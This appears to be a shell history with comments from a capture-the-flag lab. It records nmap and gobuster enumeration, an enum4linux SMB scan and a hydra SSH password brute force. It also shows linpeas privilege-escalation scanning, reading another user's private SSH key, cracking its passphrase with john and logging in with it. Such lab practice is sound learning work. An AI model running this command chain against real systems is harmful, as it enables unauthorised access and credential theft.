# shell script
clear
sudo nmap -sC -sV 10.10.61.68
gobuster -u http://10.10.61.68
gobuster dir -u http://10.10.61.68
gobuster dir -u http://10.10.61.68 -w /wordlists/Discovery/Web-Content/common.txt
ls /wordLists
ls 
ls /
ls /usr
ls /usr/share
ls /usr/share/wordlists
ls /usr/share/wordlists/dirbuster
ls /usr/share/wordlists/dirb
gobuster dir -u http://10.10.61.68 -w /usr/share/wordlists/dirb/common.txt
# Path enumeration
gobuster dir -u http://10.10.61.68 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log
# Port scans
sudo nmap -sC -sV 10.10.61.68 -o nmap_sC_sV.log
msfconsole
cd Downloads
ls
history | grep openvpn
sudo openvpn everroveractual\ \(1\).ovpn
cd @@CS
cd area-51
cd CTF_Basic
# enumerate SMB brute force
enum4linux -U -P -o -a 10.10.50.239 | tee enum4linux_1.log
# brute force password for user `jan`
hydra -l jan -P /usr/share/wordlists/fasttrack.txt ssh://10.10.50.239
# load linpeas.sh and start server
python3 -m http.server 80
# download linpeas.sh on target -- didn't work due to write permissions, but I got the idea of using scp
# scp within the box `linpeas.sh`
scp ./linpeas.sh jan@10.10.50.239:/dev/shm # didn't know how it worked - a big ass fluke
# --- on target
cd /dev/shm
chmod u+x linpeas.sh
./linpeas.sh
# --- what got me curious is the accessible keys /home/kay/.ssh/id_rsa
# /home/kay/.ssh/id_rsa - have used it plenty of times during setup for establishing comm
cat /home/kay/.ssh/id_rsa # copied file contents on my local m/c
# atk m/c
ssh2john RSAKey_for_Kay_id_rsa > fortheripper.txt
john fortheriper.txt > rippedthe.log
john fortheriper.txt --wordlist  /usr/share/wordlists/fasttrack.txt > rippedthe.log
# !found the rsa password
cp RSAKey_for_Kay_id_rsa kay_rsa_id
ssh -i kay_rsa_id kay@10.10.50.239 # didn't work. threw @WARNING: UNPROTECTED PRIVATE KEY FILE!@
chmod 600 kay_rsa_id
ssh -i kay_rsa_id kay@10.10.50.239 # got in
# --- on target
cd ~
cat pass.bak
# !done with all